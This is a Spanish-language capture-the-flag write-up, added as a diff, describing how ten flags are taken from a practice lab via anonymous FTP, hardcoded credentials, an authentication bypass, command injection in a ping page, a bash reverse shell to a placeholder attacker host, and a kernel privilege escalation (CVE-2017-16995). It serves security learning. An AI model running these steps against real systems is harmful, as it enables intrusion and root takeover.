@@ -1,0 +1,157 @@
+I" +<p>Deloitte es un laboratio práctico donde nuestro objetivo será aprovechar las vulnerabilidades encontradas en el servidor y encontrar 10 flags.</p>
+
+<p><strong>Escaneo Inicial</strong></p>
+
+<p>Una identificado el objetivo procedemos con la etapa de reconocimiento, donde haremos un escaneo a los puertos, servicios y versiones de estos.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/3.png" alt="img1" /></p>
+
+<p>El resultado de nuestro escaneo nos muestra que el servicio tiene habilitado el objetivo, empezaremos con FTP (puerto 21) este cuenta con acceso como <strong>anonymous</strong>, 
+esto nos indica que podemos ingresar por este servicio como usuario anónimo y sin necesidad de ingresar una contraseña.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/4.png" alt="img2" /></p>
+
+<p>con el comando <code class="language-plaintext highlighter-rouge">get flag.txt</code> podemos descargar el archivo <strong>flag.txt</strong> a nuestra máquina, y así leerlo. Con esto obtenemos la primera bandera.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/5.png" alt="img3" /></p>
+
+<p>Continuamos con un escaneo de directorios sobre el servicio web (puerto 80). Para esto utilizaremos la herramienta nmap junto al script http-enum, la cual hará un escaneo al objetivo con un diccionario integrado en él.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/6.png" alt="img4" /></p>
+
+<p>el resultado nos muestra una ruta interesante <strong>/robots.txt</strong> y <strong>/uploads/</strong></p>
+
+<p><img src="/secnotes/assets/img/deloitte2/7.png" alt="img5" /></p>
+
+<p>En <strong>robots.txt</strong> encontramos con el texto <strong>“disallow”</strong> esto es una instrucción que el archivo robots utiliza para impedir que rastreadores web accedan a páginas o secciones designadas de un sitio web. En este caso <strong>/cyberacademy</strong>
+Al ingresar a esta ruta encontramos nuestra segunda bandera</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/8.png" alt="img6" /></p>
+
+<p>Al ingresar por el navegador nos encontramos en la página principal 3 enlaces.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/9.png" alt="img7" /></p>
+
+<p>El primer paso antes de visitarlos es inspeccionar el código a la página principal en busca de algo de informacion oculta o algun comentario que los desarrolladores. Con la combinación de teclas <strong>ctrl + u</strong> veremos el este código, y aquí encontraremos la tercera flag.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/10.png" alt="img8" /></p>
+
+<p>Ingresamos al primer enlace <strong>Bypass_Login_1</strong>. Aquí nos solicitarán ingresar algunas credenciales para iniciar. Estas no las tenemos, así que igual que el caso anterior inspeccionaremos el código en busca de información.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/11.png" alt="img9" /></p>
+
+<p>Nos encontramos con una función que toma el valor ingresado por el usuario en el login y lo compara con los valores establecidos de la función. Si estos datos son incorrectos mostrará una alerta de que el usuario o contraseña son incorrectos</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/12.png" alt="img10" /></p>
+
+<p>La misma funcion nos entrega las credenciales de acceso. Usuario <strong>“admin”</strong> y la contraseña <strong>“supersecret”</strong>, al ingresar estos datos encontraremos la cuarta bandera.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/13.png" alt="img11" /></p>
+
+<p>En el segundo enlace, <strong>login_2</strong> nos solicitarán nuevamente credenciales, al ingresar las anteriores y nos muestra un error del servidor</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/14.png" alt="img12" /></p>
+
+<p>Al analizar las peticiones que se envía al servidor por parte nuestra (cliente), la aplicación nos concederá el acceso únicamente por la presencia de la cabecera <strong>Authorization</strong>, sin validar el contenido de esta ni las credenciales asociadas, lo que permite el acceso al sistema sin autenticación. 
+Aprovechando este comportamiento, cambiaremos el metodo HTTP de <strong>GET</strong> a <strong>FAIL</strong>, y se altera el contenido de la cabecera <strong>Authorization</strong>. El servidor no interpreta el valor <strong>FAIL</strong> como un error, sino que lo procesa como un flujo v{alido dentro de su lógica interna, permitiendo el acceso por un camino no esperado.
+En resumen. el servidor no verifica quién es el usuario, sino que la petición declara tener autorización para ingresar, lo que da lugar a una omisión de autenticación (<strong>Authentication Bypass</strong>)</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/15.png" alt="img13" /></p>
+
+<p>Al enviar la solicitud obtenemos la quinta flag.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/16 .png" alt="img14" /></p>
+
+<p>De vuelta a la página principal, el tercer enlace nos envía a ping, una aplicación web que nos indica como podemos enviar un ping a una ip que se introduzca en el navegador por método GET.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/17.png" alt="img15" /></p>
+
+<p>Ingresamos el ejemplo y efectivamente el servidor hace un ping al localhost (127.0.0.1)</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/18.png" alt="img16" /></p>
+
+<p>Podemos intentar concatenar comandos y ver si el servidor es vulnerable a <strong>RCE</strong> (remote code execution)</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/19.png" alt="img17" /></p>
+
+<p>Efectivamente, podemos enviar más de un comando al navegador. Así que listaremos archivos aprovechando esta vulnerabilidad</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/20.png" alt="img18" /></p>
+
+<p>Al listar los arcvhivos nos encontramos con <strong>esto no es una flag.txt</strong> al leerla obtenemos nuestra sexta bandera.</p>
+
+<p>Ya que podemos lanzar comandos desde el navegador, indagaremos en los directorios en busqueda de información.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/21.png" alt="img19" /></p>
+
+<p>Al navegar al directorio /home/deloitte, nos encontramos la séptima bandera.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/22.png" alt="img20" />.</p>
+
+<p>también nos encontramos con <strong>james</strong>, como no sabemos de que tipo de arcvivo se trata, usamos el comando <code class="language-plaintext highlighter-rouge">file</code> sobre él y este nos dice que es un enlace simbólico roto hacia la ruta <strong>/opt</strong></p>
+
+<p><img src="/secnotes/assets/img/deloitte2/23.png" alt="img21" /></p>
+
+<p>Ingresamos a esta ruta y nos encontramos una flag con una cadena de texto cifrada, por el tipo de caracteres que contiene, podemos asumir que es base64.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/24.png" alt="img22" /></p>
+
+<p>Decodificamos y así obtenemos nuestra octava bandera.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/25.png" alt="img23" /></p>
+
+<p>En el escaneo de directorios web, habiamos encontrado la ruta <strong>/uploads</strong>, al acceder a ella encontramos la novena bandera.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/41.png" alt="img24" /></p>
+
+<p>En este punto solo nos queda la última bandera, la correspondiente al usuario root. El siguiente paso será identificar la versión de Linux de la máquina víctima, aprovechando la vulnerabilidad de RCE vamos a utilizar el comando <code class="language-plaintext highlighter-rouge">uname -a</code> para que el servidor nos muestre esta información.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/26.png" alt="img25" /></p>
+
+<p>la versión encontrada es la 4.4, en esta versión de Linux es muy común encontrar <strong>/bin/bash</strong>, <strong>nc</strong>, <strong>Python</strong>, <strong>Python2</strong> o <strong>perl</strong>.
+Con el comando <code class="language-plaintext highlighter-rouge">which bash</code> buscaremos si está disponible en el objetivo</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/27.png" alt="img26" /></p>
+
+<p>Confirmando que existe, nos crearemos una Reverse Shell para conectarnos al servidor.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/28.png" alt="img27" /></p>
+
+<p>Se probaron distintos payloads de reverse shell. El segundo payload permitió una conexión más estable, ya que redirige explícitamente la entrada, salida y errores estándar hacia el socket TCP, evitando problemas comunes al ejecutar shells interactivas desde aplicaciones web.</p>
+
+<p><code class="language-plaintext highlighter-rouge">bash -c "bash -i &gt;/dev/tcp/&lt;IP_ATACANTE&gt;/&lt;PUERTO&gt; 0&lt;&amp;1 2&gt;&amp;1 &amp;"</code></p>
+
+<p>una vez conectados buscaremos vulnerabilidades relacionadas con la versión del kernel de la máquina víctima.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/29.png" alt="img28" /></p>
+
+<p><img src="/secnotes/assets/img/deloitte2/30.png" alt="img29" /></p>
+
+<p><img src="/secnotes/assets/img/deloitte2/31.png" alt="img30" /></p>
+
+<p>Según el resultado de searchsploit encontramos que esta versión tiene una vulnerabilidad asociada al CVE-2017-16995. Sabiendo esto vamos a descargar el exploit, lo compilaremos y lo enviaremos a la máquina víctima.
+Desde nuestra máquina vamos a crear un contenedor de Docker con una imagen de la misma versión de Linux a la que vamos a atacar, esto por que necesitamos compilar el exploit descargado. Si lo hacemos directamente en nuesto sistema operativo el binario del exploit queda ligado a la versión del SO, la versión del GLIBC, arquitectura y algunas opciones del compilador. 
+En pocas palabras es similar a crear un programa para Windows 11 y tratar de ejecutarlo en Windows XP, el archivo existe, pero el sistema no entiende las instrucciones modernas.
+Ya con el contenedor inciado y el exploit en él, procedemos a compilarlo y enviarlo a la máquina víctima.</p>
+
+<p><code class="language-plaintext highlighter-rouge">docker run -it --rm \
+  -v $(pwd):/work \
+  ubuntu:16.04 /bin/bash</code></p>
+
+<p><img src="/secnotes/assets/img/deloitte2/37.png" alt="img31" /></p>
+
+<p><img src="/secnotes/assets/img/deloitte2/38.png" alt="img31" /></p>
+
+<p><img src="/secnotes/assets/img/deloitte2/39.png" alt="img32" /></p>
+
+<p>Levantamos un servidor con <strong>python3</strong> en nuestra máquina atacante, y desde la máquina víctima descargamos el exploit compilado. Una vez terminado, le damos permisos de ejecución y al inciarse obtendremos la escalada de privilegios y acceso como el usuario root.
+Ahora solo nos queda navegar al directorio root y obtener la última bandera.</p>
+
+<p><img src="/secnotes/assets/img/deloitte2/10flag.png" alt="img33" /></p>
+
+<p>☕ ¿Te sirvió el Write-up?
+Si este contenido te ayudó a rootear la máquina o a aprender algo nuevo, ¡puedes invitarme un café! Todo el apoyo se va directo a mejorar el blog y seguir subiendo retos de DockerLabs.</p>
+
+<p><img src="https://img.buymeacoffee.com/button-api/?text=Invítame un café&amp;emoji=☕&amp;slug=TU_USUARIO&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Cookie&amp;outline_colour=000000&amp;coffee_colour=ffffff" alt="Invitame un café" /></p>
+
+:ET
